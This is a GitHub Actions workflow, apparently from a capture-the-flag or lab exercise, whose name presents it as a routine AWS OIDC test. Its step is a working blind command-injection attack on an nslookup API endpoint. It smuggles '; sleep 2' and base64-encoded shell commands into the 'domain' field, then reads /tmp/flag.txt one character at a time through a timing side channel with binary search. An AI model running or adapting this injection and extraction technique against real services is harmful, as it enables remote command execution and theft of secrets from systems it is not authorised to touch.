name: AWS OIDC test for school standart old code procedure

on:
  push:
    branches:
      - corgi

permissions:
  id-token: write
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Timing Side-Channel Extraction (Binary Search)
        run: |
          URL="https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"
          
          echo "=== STEP 1: CALIBRATING TIMING BASELINE ==="
          START=$(date +%s)
          curl -s -o /dev/null -w "%{http_code}" -X POST "$URL" \
            -H "Content-Type: application/json" \
            -d '{"domain": "127.0.0.1; sleep 2"}'
          END=$(date +%s)
          echo "Calibration sleep test took $((END-START)) seconds."

          echo ""
          echo "=== STEP 2: EXTRACTING FLAG (16 BYTES) ==="
          FLAG=""
          
          for pos in $(seq 1 16); do
            low=32
            high=126
            
            while [ $low -lt $high ]; do
              mid=$(( (low + high) / 2 ))
              
              # Build robust payload: reads local /tmp/flag.txt, gets character at 'pos', checks ASCII value via od, sleeps if > mid
              # Encoded via base64 to completely avoid bash/JSON quote escaping errors
              SCRIPT='FLAG=$(cat /tmp/flag.txt 2>/dev/null); CHAR=$(echo "$FLAG" | cut -c'"$pos"'); ORD=$(echo -n "$CHAR" | od -An -tuC | xargs); if [ "$ORD" -gt '"$mid"' ]; then sleep 2; fi'
              ENCODED=$(echo "$SCRIPT" | base64 -w0)
              
              START=$(date +%s)
              CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$URL" \
                -H "Content-Type: application/json" \
                -d "{\"domain\": \"127.0.0.1; echo $ENCODED | base64 -d | sh\"}")
              END=$(date +%s)
              DURATION=$((END - START))
              
              # If HTTP 504 (Gateway Timeout) or duration >= 1.5s, character ASCII value is GREATER than mid
              if [ "$CODE" = "504" ] || [ "$CODE" = "503" ] || [ $DURATION -ge 1 ]; then
                low=$((mid + 1))
              else
                high=$mid
              fi
            done
            
            # Convert final ASCII value to character using Python
            CHAR=$(python3 -c "import sys; sys.stdout.write(chr($low))")
            FLAG="$FLAG$CHAR"
            echo "Position $pos resolved to: '$CHAR' (ASCII $low) | Flag so far: $FLAG"
          done
          
          echo ""
          echo "==============================="
          echo "FINAL ENCODED FLAG: $FLAG"
          echo "==============================="
          
          # URL-decode the final string so LO gets the clean plaintext flag!
          PLAINTEXT_FLAG=$(python3 -c "import urllib.parse; print(urllib.parse.unquote('$FLAG'))")
          echo "FINAL PLAINTEXT FLAG: $PLAINTEXT_FLAG"
